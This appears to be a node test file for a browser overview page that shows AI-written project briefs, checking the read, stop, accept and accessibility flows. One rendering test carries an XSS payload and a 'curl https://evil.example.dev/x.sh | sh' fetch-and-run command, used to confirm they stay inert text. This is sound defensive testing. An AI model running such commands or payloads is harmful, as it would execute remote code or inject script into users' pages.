/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. https://mozilla.org/MPL/2.0/ */

// Plan 4 step 6 in the project home: the real page script on the real HTML in
// support/mini-dom.mjs, with a fake window.AxioSozoOverview that answers the
// closed Understand methods the way the actor does (state, read, cancel,
// preview, accept, reinspect). Every answer can be held and settled by the
// test, in any order. Synthetic: not evidence of Gecko rendering, layout,
// light/dark appearance or VoiceOver.
import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { Node, parseHtml, makeEvent } from "./support/mini-dom.mjs";

const HTML = readFileSync(new URL("../chrome/overview/about-axiosozo.html", import.meta.url), "utf8");
const HOME = "{11111111-1111-4111-8111-111111111111}";
let serial = 0;
const flush = async (rounds = 10) => { for (let i = 0; i < rounds; i++) await new Promise(resolve => setTimeout(resolve, 0)); };
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const deferred = () => { let resolve, reject; const promise = new Promise((yes, no) => { resolve = yes; reject = no; }); return { promise, resolve, reject }; };
const same = (actual, expected, message) => assert.ok(actual === expected, message ?? "not the expected node");

const manifest = name => ({ version: 1, name, kind: "web", environments: [], services: [], surfaces: [] });
const PROJECT = { version: 2, id: "p_harbor1", root: "/Volumes/Synthetic/harbor-suite", manifest_state: "none", context_uuid: HOME, trusted: false,
  created_at: 1, updated_at: 2, manifest: manifest("Harbor Suite"), detected: null, container: { user_context_id: null },
  shared_sites: { hosts: [], confirmed: false }, accounts: [], brief: null };
const OTHER = { ...PROJECT, id: "p_inkline1", root: "/Volumes/Synthetic/inkline", manifest: manifest("Inkline") };
const savedBrief = (product = "A booking suite for small harbours.", extra = {}) => ({ version: 1, cli: "codex", generated_at: Date.UTC(2026, 9, 2),
  accepted: false, document: { version: 1, product, apps: [{ name: "web", kind: "web", path: "apps/web", summary: "Bookings" }],
    domains: [{ host: "api.harborsuite.dev", purpose: "API" }], services: [{ name: "Convex", purpose: "backend" }],
    start: [{ label: "Web", command: "bun run dev --filter web", cwd: "apps/web" }], risks: ["Payments are untested."] }, ...extra });
const result = (status, reason = null, extra = {}) => ({ version: 1, request_id: "req:1", kind: "brief", cli: "codex", status, reason,
  document: null, data_sent: status !== "unavailable" && status !== "busy", duration_ms: 5, ...extra });
const refusal = code => ({ code, message: `${code} /private/native/detail` });

async function loadPage({ hash = "#project=p_harbor1", projects = [PROJECT, OTHER], mode = "OFFLINE_FIXTURE", handlers = {} } = {}) {
  const document = parseHtml(HTML);
  const calls = [];
  const subscribers = [];
  const state = { projects: projects.map(project => structuredClone(project)), jobs: [], clis: [] };
  const held = { reads: [], previews: [], accepts: [], inspections: [], states: [] };
  let holdStates = false;
  const defaults = {
    getOverviewFlags: () => ({ contexts: true, enginePreferences: false, jevKeyEntry: true, openaiKeyEntry: true }),
    activeContext: () => ({ uuid: HOME }),
    listContexts: () => [{ uuid: HOME, name: "Home", icon: "", type: "personal", organization_uuid: null, project_id: null, container: 0 }],
    listProjects: () => state.projects,
    listProjectContainers: () => [],
    getProjectHome: ({ id }) => {
      const stored = state.projects.find(project => project.id === id);
      if (!stored) throw refusal("UNKNOWN_PROJECT");
      const { container: _mapping, ...project } = structuredClone(stored);
      return { version: 1, project, space: { uuid: HOME, name: "Home" }, container: { state: "pending" }, agent_activity: null, console_errors: null };
    },
    listRules: () => [], getJevSettings: () => ({ consent: false, interval_minutes: 5, hourly_budget: 30 }),
    usageSummary: () => [], listOrphans: () => [], needsAttention: () => [], serviceStatus: () => [],
    getUnderstandState: () => {
      const answer = { authorization: "NOT_AUTHORIZED", mode, clis: structuredClone(state.clis), jobs: structuredClone(state.jobs) };
      if (!holdStates) return answer;
      const wait = deferred(); held.states.push({ ...wait, answer }); return wait.promise;
    },
    getUnderstandAvailability: () => { state.clis = [{ cli: "codex", version: "synthetic-1" }]; return { authorization: "NOT_AUTHORIZED", clis: state.clis }; },
    readProject: params => { const wait = deferred(); held.reads.push({ params, ...wait }); return wait.promise; },
    cancelUnderstand: () => ({ cancelled: true }),
    cancelProjectReadOperations: () => null,
    previewProjectBriefAcceptance: params => { const wait = deferred(); held.previews.push({ params, ...wait }); return wait.promise; },
    acceptProjectBrief: params => { const wait = deferred(); held.accepts.push({ params, ...wait }); return wait.promise; },
    reinspectProjectBriefAcceptance: params => { const wait = deferred(); held.inspections.push({ params, ...wait }); return wait.promise; },
  };
  const api = {
    async request(name, params) {
      calls.push([name, JSON.parse(JSON.stringify(params ?? {}))]);
      const handler = handlers[name] ?? defaults[name];
      if (!handler) throw refusal("UNKNOWN_METHOD");
      return handler(params ?? {}, state);
    },
    subscribe(callback) { subscribers.push(callback); return () => {}; },
  };
  const listeners = new Map();
  const location = { hash };
  Object.assign(globalThis, { document, Node, location,
    window: { AxioSozoOverview: api, addEventListener: (type, fn) => listeners.set(type, fn) },
    history: { replaceState: (_state, _title, url) => { location.hash = url; } },
    CSS: { escape: value => String(value).replace(/["\\]/g, "\\$&") } });
  await import(`../chrome/overview/about-axiosozo.mjs?understand=${++serial}`);
  await flush();
  const $ = id => document.getElementById(id);
  const about = () => $("project-home").querySelector('[data-section="about"]');
  const panel = () => about()?.querySelector(".understand") ?? null;
  const button = (root, label) => root?.querySelectorAll("button").find(node => node.textContent === label || node.getAttribute("aria-label") === label) ?? null;
  const named = name => calls.filter(([call]) => call === name);
  return {
    document, calls, state, held, $, about, panel, button, named, location,
    holdStates(on) { holdStates = on; },
    navigate: async next => { location.hash = next; listeners.get("hashchange")?.(); await flush(); },
    emit: async name => { for (const callback of subscribers) callback({ name }); await sleep(150); await flush(); },
    fire: async (type, event = {}) => { listeners.get(type)?.(event); await flush(); },
    status: () => panel()?.querySelector(".understand-status")?.textContent ?? "",
    toast: () => $("status").textContent,
    setBrief(brief, id = "p_harbor1") { state.projects = state.projects.map(project => (project.id === id ? { ...project, brief } : project)); },
    async press(label) { button(panel(), label).click(); await flush(); },
    async jobs(jobs) { state.jobs = jobs; for (const callback of subscribers) callback({ name: "understand" }); await sleep(150); await flush(); },
  };
}
const job = (state, status = null, reason = null) => ({ request_id: "req:1", project_id: "p_harbor1", state, status, reason, data_sent: state !== "queued" });
const strayText = root => {
  const found = [];
  const walk = node => { for (const child of node.childNodes) { if (child.data !== undefined) { if (/\b(null|undefined)\b|\[object /u.test(child.data)) found.push(child.data); } else walk(child); } };
  walk(root);
  return found;
};
const allValues = document => JSON.stringify(document.querySelectorAll("*").map(node => [...node.attributes.values(), node.value ?? "", node.textContent]));

// ---------------------------------------------------------------- production and fixture modes

test("production: a saved brief stays a document, no Read controls are offered, and nothing but the state is asked", async () => {
  const page = await loadPage({ mode: "PRODUCTION", projects: [{ ...PROJECT, brief: savedBrief() }] });
  const brief = page.about().querySelector(".brief");
  assert.ok(brief && !brief.classList.contains("absent"));
  assert.equal(page.$("project-home").querySelector(".home-lede").textContent, "A booking suite for small harbours.");
  same(page.panel(), null, "no Read part where reading is not available");
  assert.equal(page.named("readProject").length + page.named("getUnderstandAvailability").length, 0);
  assert.deepEqual(page.named("getUnderstandState"), [["getUnderstandState", { projectId: "p_harbor1" }]]);
  // Without a brief, the closed state is said plainly.
  const empty = await loadPage({ mode: "PRODUCTION" });
  assert.match(empty.about().querySelector(".brief.absent").textContent, /No brief yet\. .*Writing one is not available in this build\./u);
  await empty.emit("projects");
  await empty.emit("understand");
  assert.equal(empty.named("readProject").length, 0, "events never start a read");
});

test("fixture: Read is explicit — not on entry, events, refresh or metadata; the user's choice is sent once; duplicate presses are ignored", async () => {
  const page = await loadPage();
  const panel = page.panel();
  assert.ok(panel, "the Read part is offered in synthetic test mode");
  assert.match(panel.textContent, /Synthetic test mode/u);
  assert.match(panel.textContent, /No assistant or provider is contacted/u);
  assert.equal(panel.getAttribute("role"), "group");
  same(page.$(panel.getAttribute("aria-labelledby")), panel.querySelector("h4"));
  assert.match(page.about().querySelector(".brief.absent").textContent, /Read the project below to write one/u);
  for (const event of ["projects", "contexts", "understand"]) await page.emit(event);
  await page.navigate("#project=p_harbor1");
  assert.equal(page.named("readProject").length, 0, "no read on entry, events or a route refresh");
  // Metadata is its own explicit action and starts no read.
  await page.press("Check versions");
  assert.equal(page.named("getUnderstandAvailability").length, 1);
  assert.match(page.panel().textContent, /Codex: synthetic-1 · Claude Code: not found|Claude Code: not found · Codex: synthetic-1/u);
  assert.equal(page.named("readProject").length, 0);
  await page.press("Read with Codex");
  assert.deepEqual(page.named("readProject"), [["readProject", { projectId: "p_harbor1", cli: "codex" }]], "the page names the project and CLI only");
  assert.equal(page.status(), "Starting…");
  for (const label of ["Read with Codex", "Read with Claude Code"]) {
    const node = page.button(page.panel(), label);
    assert.equal(node.getAttribute("aria-disabled"), "true", `${label} is inactive but focusable`);
    assert.equal(node.disabled, false);
    node.click();
  }
  await page.jobs([job("queued")]);
  page.button(page.panel(), "Read with Claude Code").click();
  await flush();
  assert.equal(page.named("readProject").length, 1, "no duplicate activation while a read is pending");
});

test("queued, running and saving stay visible; saving is not success; only the browser's saved record is shown as the brief", async () => {
  const page = await loadPage({ projects: [{ ...PROJECT, brief: savedBrief("The earlier brief.") }, OTHER] });
  await page.press("Read with Codex");
  await page.jobs([job("queued")]);
  assert.match(page.status(), /^Waiting to start/u);
  assert.equal(page.button(page.panel(), "Stop reading").hidden, false, "a queued read can be stopped");
  await page.jobs([job("running")]);
  assert.equal(page.status(), "Reading the folder with Codex…");
  await page.jobs([job("persisting")]);
  assert.equal(page.status(), "Saving the brief…");
  assert.equal(page.button(page.panel(), "Stop reading").hidden, true, "a save cannot be stopped");
  assert.doesNotMatch(page.status(), /saved\./u, "persisting is not completed success");
  assert.equal(page.$("project-home").querySelector(".home-lede").textContent, "The earlier brief.", "the earlier brief stays until the save is published");
  // The answer carries a document; the page shows only what the browser saved.
  page.setBrief(savedBrief("The newly saved brief."));
  const homes = page.named("getProjectHome").length;
  // As the facade does: the job is complete before readProject answers.
  page.state.jobs = [job("complete", "ok")];
  page.held.reads[0].resolve(result("ok", null, { document: { ...savedBrief("UNSAVED ANSWER TEXT").document } }));
  await flush();
  assert.equal(page.status(), "Brief saved. It is shown above.");
  assert.equal(page.toast(), "Brief saved. It is shown above.");
  assert.equal(page.named("getProjectHome").length, homes + 1, "the saved record is read again");
  assert.equal(page.$("project-home").querySelector(".home-lede").textContent, "The newly saved brief.");
  assert.doesNotMatch(page.$("project-home").textContent, /UNSAVED ANSWER TEXT/u);
  assert.match(page.panel().textContent, /synthetic test reader was started/u, "data_sent is shown as a fact");
});

for (const [label, answer, text] of [
  ["a stop", result("cancelled", "CANCELLED"), /^Stopped\. Nothing was saved/u],
  ["a timeout", result("timeout", "TIMEOUT"), /took too long/u],
  ["invalid output", result("invalid_output", "SCHEMA_MISMATCH"), /not a valid brief, so nothing was saved/u],
  ["a full queue", result("busy", "QUEUE_FULL"), /Too many reads are waiting/u],
  ["the closed product path", result("unavailable", "NOT_AUTHORIZED"), /not available in this build, so nothing was sent/u],
  ["a failed CLI", result("failed", "EXIT_NONZERO"), /Codex could not finish reading this project/u],
  ["a failed save", refusal("BRIEF_SAVE_FAILED"), /could not be saved\. Any earlier brief is unchanged/u],
  ["a changing project", refusal("PROJECT_CHANGED"), /This project is changing right now/u],
  ["an unknown failure", refusal("SERVICE_FAILURE"), /The reader is not available right now/u],
]) {
  test(`${label} keeps the earlier brief and says so calmly, without a raw code`, async () => {
    const page = await loadPage({ projects: [{ ...PROJECT, brief: savedBrief("The earlier brief.") }, OTHER] });
    await page.press("Read with Codex");
    if (answer.code) page.held.reads[0].reject(answer); else page.held.reads[0].resolve(answer);
    await flush();
    assert.match(page.status(), text);
    assert.doesNotMatch(page.status() + page.toast(), /[A-Z]{3,}_[A-Z_]+|\/private/u, "no reason code or native detail as prose");
    assert.equal(page.$("project-home").querySelector(".home-lede").textContent, "The earlier brief.", "the earlier brief is still shown");
    assert.equal(page.button(page.panel(), "Read with Codex").hasAttribute("aria-disabled"), false, "Read is offered again");
  });
}

test("Stop asks to cancel this page's own read; the acknowledgement is not the result; focus returns to Read", async () => {
  const page = await loadPage();
  await page.press("Read with Codex");
  await page.jobs([job("running")]);
  const stop = page.button(page.panel(), "Stop reading");
  stop.focus();
  stop.click();
  await flush();
  assert.deepEqual(page.named("cancelUnderstand"), [["cancelUnderstand", { projectId: "p_harbor1", requestId: "req:1" }]]);
  assert.equal(page.status(), "Reading the folder with Codex…", "still reading until its own result arrives");
  page.state.jobs = [job("complete", "cancelled", "CANCELLED")];
  page.held.reads[0].resolve(result("cancelled", "CANCELLED"));
  await flush();
  assert.match(page.status(), /^Stopped\./u);
  same(page.document.activeElement, page.button(page.panel(), "Read with Codex"), "focus moves from Stop to the Read it started from");
});

test("an owner lost while it read (another tab selected): the page says so without claiming nothing was saved, and re-reads the record", async () => {
  const page = await loadPage();
  await page.press("Read with Codex");
  const homes = page.named("getProjectHome").length;
  page.held.reads[0].reject(refusal("OWNER_REVOKED"));
  await flush();
  assert.match(page.status(), /another tab was selected or this page was left\. The brief shown is the one that is saved\./u);
  assert.doesNotMatch(page.status(), /Nothing was saved/u);
  assert.equal(page.named("getProjectHome").length, homes + 1);
  // Shown again, the home asks for its fresh state.
  const states = page.named("getUnderstandState").length;
  page.document.visibilityState = "visible";
  for (const fn of page.document.listeners.get("visibilitychange") ?? []) fn({ type: "visibilitychange" });
  await flush();
  assert.equal(page.named("getUnderstandState").length, states + 1);
});

// ---------------------------------------------------------------- lifetimes

test("route A → list → A, another project and pagehide/restore: late answers publish no status, toast, focus or follow-up request", async () => {
  const page = await loadPage();
  await page.press("Read with Codex");
  await page.navigate("#projects");
  assert.equal(page.named("cancelProjectReadOperations").length, 1, "leaving ends this page's owner in the browser");
  await page.navigate("#project=p_harbor1");
  const focused = page.document.activeElement;
  const before = { calls: page.calls.length, toast: page.toast() };
  page.held.reads[0].resolve(result("ok"));
  await flush();
  assert.equal(page.status(), "", "the new visit shows nothing of the old read");
  assert.equal(page.toast(), before.toast, "no toast");
  same(page.document.activeElement, focused, "focus does not move");
  assert.equal(page.calls.length, before.calls, "no home, state or other request follows a late answer");
  // Another project's late refusal is just as quiet.
  await page.press("Read with Codex");
  await page.navigate("#project=p_inkline1");
  const atSwitch = page.calls.length;
  page.held.reads[1].reject(refusal("BRIEF_SAVE_FAILED"));
  await flush();
  assert.equal(page.status(), "");
  assert.equal(page.calls.length, atSwitch);
  // Hidden while reading: the visit ends; a late result after the restore changes nothing.
  await page.press("Read with Claude Code");
  assert.deepEqual(page.named("readProject").at(-1), ["readProject", { projectId: "p_inkline1", cli: "claude-code" }]);
  const cancels = page.named("cancelProjectReadOperations").length;
  await page.fire("pagehide");
  assert.equal(page.named("cancelProjectReadOperations").length, cancels + 1);
  await page.fire("pageshow", { persisted: true });
  await flush();
  const restored = page.calls.length;
  page.held.reads[2].resolve(result("ok"));
  await flush();
  assert.equal(page.status(), "");
  assert.equal(page.calls.length, restored);
  assert.equal(page.named("readProject").length, 3, "a restore never re-sends a read");
});

test("a late state answer from an earlier visit is dropped; the latest state of this visit wins", async () => {
  const page = await loadPage();
  await page.press("Read with Codex");
  page.holdStates(true);
  page.state.jobs = [job("running")];
  await page.emit("understand");
  assert.equal(page.held.states.length, 1, "the first visit's state answer is out");
  // The browser ended that owner on leaving: the next visit's owner has no jobs.
  page.state.jobs = [];
  await page.navigate("#projects");
  await page.navigate("#project=p_harbor1");
  assert.equal(page.held.states.length, 2);
  page.holdStates(false);
  page.held.states[1].resolve(page.held.states[1].answer);
  await flush();
  page.held.states[0].resolve(page.held.states[0].answer);
  await flush();
  assert.equal(page.status(), "", "the earlier visit's running state is not shown");
  assert.equal(page.button(page.panel(), "Read with Codex").hasAttribute("aria-disabled"), false, "Read is offered in the new visit");
});

// ---------------------------------------------------------------- accepting the brief

test("Accept: a fresh preview every time; a review of name and kind only; the token never reaches the DOM; Cancel and Escape restore focus", async () => {
  const page = await loadPage({ projects: [{ ...PROJECT, brief: savedBrief() }, OTHER] });
  const accept = () => page.about().querySelector('[data-focus-key="brief:action"]');
  assert.equal(accept().textContent, "Accept into project file…");
  same(page.$(accept().getAttribute("aria-describedby")), page.about().querySelector("#brief-action-help"));
  accept().focus();
  accept().click();
  await flush();
  assert.deepEqual(page.named("previewProjectBriefAcceptance"), [["previewProjectBriefAcceptance", { projectId: "p_harbor1" }]]);
  assert.equal(accept().getAttribute("aria-disabled"), "true", "no second review while the preview is out");
  accept().click();
  await flush();
  assert.equal(page.named("previewProjectBriefAcceptance").length, 1);
  const TOKEN = "Tok_en-0123456789abcdefABCDEF";
  page.held.previews[0].resolve({ token: TOKEN, manifest: { ...manifest("Disk Harbor"), kind: "desktop" } });
  await flush();
  const sheet = page.$("sheet");
  assert.equal(sheet.open, true);
  assert.equal(page.$("sheet-title").textContent, "Accept into the project file");
  same(page.document.activeElement, page.$("sheet-title"), "focus moves into the review");
  const body = page.$("sheet-body");
  assert.match(body.textContent, /Only these two are written/u);
  assert.match(body.textContent, /no commands, domains, services or risks/u);
  assert.deepEqual(body.querySelectorAll("input, select").map(node => [node.localName, node.value]), [["input", "Disk Harbor"], ["select", "desktop"]]);
  assert.doesNotMatch(allValues(page.document), new RegExp(TOKEN, "u"), "the token is private page state");
  assert.doesNotMatch(body.textContent, /bun run dev|api\.harborsuite|Payments are untested/u, "nothing of the brief is offered for the file");
  page.button(sheet, "Cancel").click();
  await flush();
  assert.equal(sheet.open, false);
  same(page.document.activeElement, accept(), "focus returns to Accept");
  assert.equal(page.named("acceptProjectBrief").length, 0, "cancelled: nothing sent");
  // Every later confirmation starts with a fresh preview; Escape closes it the same way.
  accept().click();
  await flush();
  assert.equal(page.named("previewProjectBriefAcceptance").length, 2);
  page.held.previews[1].resolve({ token: "Second_token_0123456789", manifest: manifest("Disk Harbor") });
  await flush();
  sheet.dispatchEvent(makeEvent("cancel"));
  await flush();
  assert.equal(sheet.open, false);
  assert.equal(page.named("acceptProjectBrief").length, 0);
});

test("Write project file sends the confirmed name and kind once; ACCEPTED is shown only from the saved record afterwards", async () => {
  const page = await loadPage({ projects: [{ ...PROJECT, brief: savedBrief() }, OTHER] });
  // A keyboard user: focus on Accept, then activate it.
  page.about().querySelector('[data-focus-key="brief:action"]').focus();
  page.about().querySelector('[data-focus-key="brief:action"]').click();
  await flush();
  page.held.previews[0].resolve({ token: "Token_for_this_review_01", manifest: manifest("Disk Harbor") });
  await flush();
  const body = page.$("sheet-body");
  const name = body.querySelector("input");
  name.value = "  Harbor Suite  ";
  name.dispatchEvent(makeEvent("input"));
  const kind = body.querySelector("select");
  kind.value = "desktop";
  kind.dispatchEvent(makeEvent("change"));
  const write = page.button(page.$("sheet"), "Write project file");
  write.click();
  write.click();
  await flush();
  assert.deepEqual(page.named("acceptProjectBrief"), [["acceptProjectBrief",
    { projectId: "p_harbor1", token: "Token_for_this_review_01", edits: { name: "Harbor Suite", kind: "desktop" }, confirmed: true }]], "once, name and kind only");
  page.setBrief({ ...savedBrief(), accepted: true });
  page.state.projects = page.state.projects.map(project => (project.id === "p_harbor1" ? { ...project, manifest: { ...manifest("Harbor Suite"), kind: "desktop" }, manifest_state: "written" } : project));
  page.held.accepts[0].resolve({ status: "ACCEPTED", committed: true, reason: null });
  await flush();
  assert.equal(page.$("sheet").open, false);
  const brief = page.about().querySelector(".brief");
  assert.equal(brief.querySelector(".brief-head .tag").textContent, "Accepted into the project file");
  same(brief.querySelector('[data-focus-key="brief:action"]'), null, "nothing left to accept");
  assert.match(brief.querySelector(".brief-notice").textContent, /^Accepted\. The project file has the name and kind you confirmed/u);
  same(page.document.activeElement, page.$("home-brief-heading"), "focus lands on the brief, not on a removed button");
  // An invalid name never leaves the page.
  const again = await loadPage({ projects: [{ ...PROJECT, brief: savedBrief() }, OTHER] });
  again.about().querySelector('[data-focus-key="brief:action"]').click();
  await flush();
  again.held.previews[0].resolve({ token: "Token_for_this_review_02", manifest: manifest("Disk Harbor") });
  await flush();
  const input = again.$("sheet-body").querySelector("input");
  input.value = "   ";
  input.dispatchEvent(makeEvent("input"));
  again.button(again.$("sheet"), "Write project file").click();
  await flush();
  assert.equal(again.named("acceptProjectBrief").length, 0);
  assert.match(again.$("sheet-body").querySelector(".errors").textContent, /1 to 80 characters/u);
});

test("REINSPECTION_REQUIRED offers only the explicit check, which never writes again; INSPECTED brings Accept back", async () => {
  const page = await loadPage({ projects: [{ ...PROJECT, brief: savedBrief() }, OTHER] });
  page.about().querySelector('[data-focus-key="brief:action"]').click();
  await flush();
  page.held.previews[0].resolve({ token: "Token_for_this_review_03", manifest: manifest("Disk Harbor") });
  await flush();
  page.button(page.$("sheet"), "Write project file").click();
  await flush();
  page.held.accepts[0].resolve({ status: "REINSPECTION_REQUIRED", committed: null, reason: "WRITE_OUTCOME_UNKNOWN" });
  await flush();
  const action = () => page.about().querySelector('[data-focus-key="brief:action"]');
  assert.equal(action().textContent, "Check the project file");
  assert.match(page.about().querySelector(".brief-notice").textContent, /could not confirm whether the project file was written/u);
  action().click();
  await flush();
  assert.deepEqual(page.named("reinspectProjectBriefAcceptance"), [["reinspectProjectBriefAcceptance", { projectId: "p_harbor1" }]]);
  assert.equal(page.named("acceptProjectBrief").length, 1, "never a blind retry");
  assert.equal(page.named("previewProjectBriefAcceptance").length, 1, "no new review while the outcome is owed");
  page.held.inspections[0].resolve({ status: "INSPECTED", committed: null, reason: "WRITE_OUTCOME_UNKNOWN" });
  await flush();
  assert.equal(action().textContent, "Accept into project file…");
  assert.match(page.about().querySelector(".brief-notice").textContent, /brief is not marked accepted\. Review and accept again/u);
  same(page.about().querySelector(".brief-head .tag"), null, "not shown as accepted");
});

for (const [label, settle, expected, inspect] of [
  ["a refused write", entry => entry.resolve({ status: "REFUSED", committed: false, reason: "MANIFEST_CHANGED" }), /^Nothing was written: the project file changed/u, false],
  ["a changed file after its write", entry => entry.resolve({ status: "CHANGED", committed: true, reason: "MANIFEST_CHANGED" }), /changed right after it was written, so the brief is not marked accepted/u, false],
  ["a changed project during its write", entry => entry.resolve({ status: "CHANGED", committed: true, reason: "STALE_PROJECT" }), /was written, but the project changed meanwhile/u, false],
  ["authority lost after dispatch", entry => entry.reject(refusal("WRITE_OUTCOME_UNKNOWN")), /cannot confirm whether it was/u, true],
  ["an expired review", entry => entry.reject(refusal("STALE_ACCEPTANCE")), /no longer valid.*Nothing was written; open Accept again/u, false],
]) {
  test(`${label} is its own truthful outcome; only ACCEPTED is success`, async () => {
    const page = await loadPage({ projects: [{ ...PROJECT, brief: savedBrief() }, OTHER] });
    page.about().querySelector('[data-focus-key="brief:action"]').click();
    await flush();
    page.held.previews[0].resolve({ token: "Token_for_this_review_04", manifest: manifest("Disk Harbor") });
    await flush();
    page.button(page.$("sheet"), "Write project file").click();
    await flush();
    settle(page.held.accepts[0]);
    await flush();
    const notice = page.about().querySelector(".brief-notice").textContent;
    assert.match(notice, expected);
    assert.doesNotMatch(notice, /^Accepted/u);
    if (inspect) assert.doesNotMatch(notice, /Nothing was written/u, "never claims a rollback");
    assert.equal(page.about().querySelector('[data-focus-key="brief:action"]').textContent, inspect ? "Check the project file" : "Accept into project file…");
    same(page.about().querySelector(".brief-head .tag"), null, "never shown as accepted");
  });
}

test("a preview refused for an owed inspection offers the check; a stale preview after leaving opens nothing", async () => {
  const page = await loadPage({ projects: [{ ...PROJECT, brief: savedBrief() }, { ...OTHER, brief: savedBrief() }] });
  page.about().querySelector('[data-focus-key="brief:action"]').click();
  await flush();
  page.held.previews[0].reject(refusal("MANIFEST_REINSPECTION_REQUIRED"));
  await flush();
  assert.equal(page.about().querySelector('[data-focus-key="brief:action"]').textContent, "Check the project file");
  // Leave while a preview is out: its late answer opens no review and moves no focus.
  await page.navigate("#project=p_inkline1");
  page.about().querySelector('[data-focus-key="brief:action"]').click();
  await flush();
  await page.navigate("#projects");
  const focused = page.document.activeElement;
  page.held.previews[1].resolve({ token: "Late_token_000000000000", manifest: manifest("Inkline") });
  await flush();
  assert.equal(page.$("sheet").open, false);
  same(page.document.activeElement, focused);
  assert.doesNotMatch(allValues(page.document), /Late_token/u);
});

test("closing the review while its write is out: the outcome of that write is still told, focus stays put, nothing is re-sent", async () => {
  const page = await loadPage({ projects: [{ ...PROJECT, brief: savedBrief() }, OTHER] });
  page.about().querySelector('[data-focus-key="brief:action"]').click();
  await flush();
  page.held.previews[0].resolve({ token: "Token_for_this_review_05", manifest: manifest("Disk Harbor") });
  await flush();
  page.button(page.$("sheet"), "Write project file").click();
  await flush();
  page.$("sheet").dispatchEvent(makeEvent("cancel"));
  await flush();
  const focused = page.document.activeElement;
  page.held.accepts[0].resolve({ status: "REFUSED", committed: false, reason: "BUSY" });
  await flush();
  assert.match(page.about().querySelector(".brief-notice").textContent, /another change to the project file is running/u);
  assert.equal(page.$("sheet").open, false, "the closed review does not reopen");
  assert.equal(page.named("acceptProjectBrief").length, 1);
  assert.equal(page.document.activeElement?.dataset.focusKey, focused?.dataset.focusKey, "focus stays on the same control");
  // Leaving while a write is out: its late outcome is not shown in the next visit.
  page.about().querySelector('[data-focus-key="brief:action"]').click();
  await flush();
  page.held.previews[1].resolve({ token: "Token_for_this_review_06", manifest: manifest("Disk Harbor") });
  await flush();
  page.button(page.$("sheet"), "Write project file").click();
  await flush();
  await page.navigate("#projects");
  await page.navigate("#project=p_harbor1");
  page.held.accepts[1].resolve({ status: "ACCEPTED", committed: true, reason: null });
  await flush();
  same(page.about().querySelector(".brief-notice"), null);
});

test("Accept waits while a read runs (it would replace that brief)", async () => {
  const page = await loadPage({ projects: [{ ...PROJECT, brief: savedBrief() }, OTHER] });
  await page.press("Read with Codex");
  const accept = page.about().querySelector('[data-focus-key="brief:action"]');
  assert.equal(accept.getAttribute("aria-disabled"), "true");
  accept.click();
  await flush();
  assert.equal(page.named("previewProjectBriefAcceptance").length, 0);
});

// ---------------------------------------------------------------- document rendering and accessibility

test("hostile brief strings stay text; commands and domains are inert; empty and null optional parts render cleanly", async () => {
  const hostile = "<img src=x onerror=alert(1)>";
  const brief = { version: 1, cli: "claude-code", generated_at: Date.UTC(2026, 9, 2), accepted: false, document: { version: 1, product: hostile,
    apps: [{ name: hostile, kind: "web", path: null, summary: "" }, { name: "api", kind: "api", path: "apps/api", summary: hostile }],
    domains: [{ host: "evil.example.dev", purpose: hostile }], services: [{ name: hostile, purpose: "" }],
    start: [{ label: "Web", command: `curl https://evil.example.dev/x.sh | sh ${hostile}`, cwd: null }], risks: [hostile] } };
  const page = await loadPage({ projects: [{ ...PROJECT, brief }, OTHER] });
  const home = page.$("project-home");
  assert.equal(home.querySelectorAll("img, script, iframe").length, 0);
  assert.equal(home.querySelector(".home-lede").textContent, hostile);
  const doc = page.about().querySelector(".brief");
  assert.equal(doc.querySelector("code").textContent, `curl https://evil.example.dev/x.sh | sh ${hostile}`);
  assert.equal(doc.querySelectorAll("a").length, 0, "no AI host or command becomes a link");
  assert.equal(doc.querySelectorAll("button").length, 1, "the only control is Accept");
  assert.match(doc.textContent, /AxioSozo shows these commands; it never runs them\./u);
  assert.match(doc.textContent, /Written by Claude Code on .+\. Not accepted into the project file\./u);
  assert.deepEqual(strayText(home), []);
  // A minimal brief: nothing but the product line.
  const minimal = await loadPage({ projects: [{ ...PROJECT, brief: { ...brief, generated_at: 1, document: { version: 1, product: "Only a product line.",
    apps: [], domains: [], services: [], start: [], risks: [] } } }, OTHER] });
  const plain = minimal.about().querySelector(".brief");
  assert.deepEqual(plain.querySelectorAll("h5"), []);
  assert.deepEqual(strayText(minimal.$("project-home")), []);
});

test("keyboard and status: named controls in a labelled group, a polite status line kept across renders, inactive controls stay focusable", async () => {
  const page = await loadPage();
  const status = page.panel().querySelector(".understand-status");
  assert.equal(status.getAttribute("role"), "status");
  assert.equal(status.getAttribute("aria-live"), "polite");
  const group = page.panel().querySelector(".understand-actions");
  assert.equal(group.getAttribute("role"), "group");
  assert.equal(group.getAttribute("aria-label"), "Read with");
  for (const control of page.panel().querySelectorAll("button")) {
    assert.ok((control.getAttribute("aria-label") ?? control.textContent).trim(), "every control has a name");
  }
  for (const dot of page.panel().querySelectorAll(".dot")) assert.equal(dot.getAttribute("aria-hidden"), "true");
  const read = page.button(page.panel(), "Read with Codex");
  read.focus();
  read.click();
  await flush();
  // A projects event re-renders the home: the same status node and focus survive.
  await page.emit("projects");
  same(page.panel().querySelector(".understand-status"), status, "the live region is not replaced");
  same(page.document.activeElement, page.button(page.panel(), "Read with Codex"), "focus stays on the Read the user pressed");
  assert.equal(page.status(), "Starting…");
  // Section outline unchanged: Read sits inside About, under the brief.
  assert.deepEqual(page.$("project-home").querySelectorAll("h2, h3").map(node => node.localName), ["h2", "h3", "h3", "h3", "h3"]);
  const children = page.about().children.map(node => node.className);
  assert.ok(children.indexOf("understand") > children.findIndex(name => name.startsWith("brief")), "the Read part follows the brief");
});

test("existing Step 5 and site-rule surfaces are untouched by the Read part", async () => {
  const page = await loadPage();
  await page.navigate("#ai");
  assert.ok(page.$("decision-keys-body").querySelector('[data-provider="jev"]'));
  assert.ok(page.$("decision-keys-body").querySelector('[data-provider="openai"]'));
  assert.equal(page.named("cancelProjectReadOperations").length, 1, "leaving the home ends its Understand owner only");
  assert.equal(page.named("cancelDecisionKeyOperations").length, 0, "the key lifetime is separate");
  await page.navigate("#rules");
  page.$("add-rule").click();
  await flush();
  const providers = page.$("sheet-body").querySelectorAll('input[name="provider"]').map(node => node.value);
  assert.deepEqual(providers, ["jev", "openai"]);
  const screen = page.$("sheet-body").querySelectorAll('input[name="observation"]').find(node => node.value === "screen");
  assert.equal(screen.disabled, true, "Screen observation stays unavailable for a new choice");
});
